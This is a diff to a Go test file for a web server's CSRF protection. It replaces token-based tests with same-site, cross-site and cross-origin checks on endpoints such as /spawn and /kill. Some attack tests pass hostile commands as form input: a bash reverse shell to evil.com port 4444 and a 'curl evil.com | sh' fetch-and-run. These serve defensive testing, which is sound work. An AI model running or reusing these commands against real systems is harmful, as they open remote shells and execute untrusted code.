@@ -8,7 +8,7 @@ import (
 	"testing"
 )
 
-func TestCSRF_PostWithoutTokenRejected(t *testing.T) {
+func TestCSRF_CrossSitePostRejected(t *testing.T) {
 	mux := http.NewServeMux()
 	mux.HandleFunc("/spawn", handleSpawn)
 	handler := newCSRFHandler(mux)
@@ -17,45 +17,14 @@ func TestCSRF_PostWithoutTokenRejected(t *testing.T) {
 	form.Set("dir", "/tmp")
 	form.Set("cmd", "echo")
 
-	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
+	w := crossSitePost(t, handler, "/spawn", form)
 
 	if w.Code != http.StatusForbidden {
-		t.Errorf("POST without CSRF token: expected 403, got %d", w.Code)
+		t.Errorf("cross-site POST: expected 403, got %d", w.Code)
 	}
 }
 
-func TestCSRF_PostWithWrongTokenRejected(t *testing.T) {
-	mux := http.NewServeMux()
-	mux.HandleFunc("/", handleIndex)
-	mux.HandleFunc("/spawn", handleSpawn)
-	handler := newCSRFHandler(mux)
-
-	_, cookies := getCSRFToken(t, handler)
-
-	form := url.Values{}
-	form.Set("dir", "/tmp")
-	form.Set("cmd", "echo")
-	form.Set("gorilla.csrf.Token", "wrong-token")
-
-	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	for _, c := range cookies {
-		req.AddCookie(c)
-	}
-
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
-
-	if w.Code != http.StatusForbidden {
-		t.Errorf("POST with wrong CSRF token: expected 403, got %d", w.Code)
-	}
-}
-
-func TestCSRF_PostWithValidTokenAccepted(t *testing.T) {
+func TestCSRF_SameSitePostAccepted(t *testing.T) {
 	mux := http.NewServeMux()
 	mux.HandleFunc("/", handleIndex)
 	mux.HandleFunc("/spawn", handleSpawn)
@@ -65,10 +34,31 @@ func TestCSRF_PostWithValidTokenAccepted(t *testing.T) {
 	form.Set("dir", "/tmp")
 	form.Set("cmd", "echo")
 
-	w := postWithCSRF(t, handler, "/spawn", form)
+	w := sameSitePost(t, handler, "/spawn", form)
 
 	if w.Code == http.StatusForbidden {
-		t.Errorf("POST with valid CSRF token: got 403 (body: %s)", w.Body.String())
+		t.Errorf("same-site POST: got 403 (body: %s)", w.Body.String())
+	}
+}
+
+func TestCSRF_CrossOriginPostRejected(t *testing.T) {
+	mux := http.NewServeMux()
+	mux.HandleFunc("/spawn", handleSpawn)
+	handler := newCSRFHandler(mux)
+
+	form := url.Values{}
+	form.Set("dir", "/tmp")
+	form.Set("cmd", "echo")
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "https://evil.com")
+
+	w := httptest.NewRecorder()
+	handler.ServeHTTP(w, req)
+
+	if w.Code != http.StatusForbidden {
+		t.Errorf("cross-origin POST: expected 403, got %d", w.Code)
 	}
 }
 
@@ -93,14 +83,10 @@ func TestCSRF_AllPostEndpointsProtected(t *testing.T) {
 		form.Set("cmd", "echo")
 		form.Set("project", "test")
 
-		req := httptest.NewRequest("POST", path, strings.NewReader(form.Encode()))
-		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
-		w := httptest.NewRecorder()
-		handler.ServeHTTP(w, req)
+		w := crossSitePost(t, handler, path, form)
 
 		if w.Code != http.StatusForbidden {
-			t.Errorf("POST %s without CSRF: expected 403, got %d", path, w.Code)
+			t.Errorf("cross-site POST %s: expected 403, got %d", path, w.Code)
 		}
 	}
 }
@@ -118,11 +104,7 @@ func TestAttack_CrossSiteSpawnReverseShell(t *testing.T) {
 	form.Set("dir", "/tmp")
 	form.Set("cmd", "bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'")
 
-	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
+	w := crossSitePost(t, handler, "/spawn", form)
 
 	if w.Code != http.StatusForbidden {
 		t.Errorf("ATTACK SUCCEEDED: Cross-site reverse shell spawn returned %d, expected 403", w.Code)
@@ -138,11 +120,7 @@ func TestAttack_HiddenFormAutoSubmit(t *testing.T) {
 	form.Set("dir", "/tmp")
 	form.Set("cmd", "curl evil.com | sh")
 
-	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
+	w := crossSitePost(t, handler, "/spawn", form)
 
 	if w.Code != http.StatusForbidden {
 		t.Errorf("ATTACK SUCCEEDED: Hidden form CSRF returned %d, expected 403", w.Code)
@@ -165,11 +143,8 @@ func TestAttack_KillAllSessions(t *testing.T) {
 	handler := newCSRFHandler(mux)
 
 	form := url.Values{}
-	req := httptest.NewRequest("POST", "/kill/claude-project-happy-otter", strings.NewReader(form.Encode()))
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 
-	w := httptest.NewRecorder()
-	handler.ServeHTTP(w, req)
+	w := crossSitePost(t, handler, "/kill/claude-project-happy-otter", form)
 
 	if w.Code != http.StatusForbidden {
 		t.Errorf("ATTACK SUCCEEDED: Session kill DoS returned %d, expected 403", w.Code)
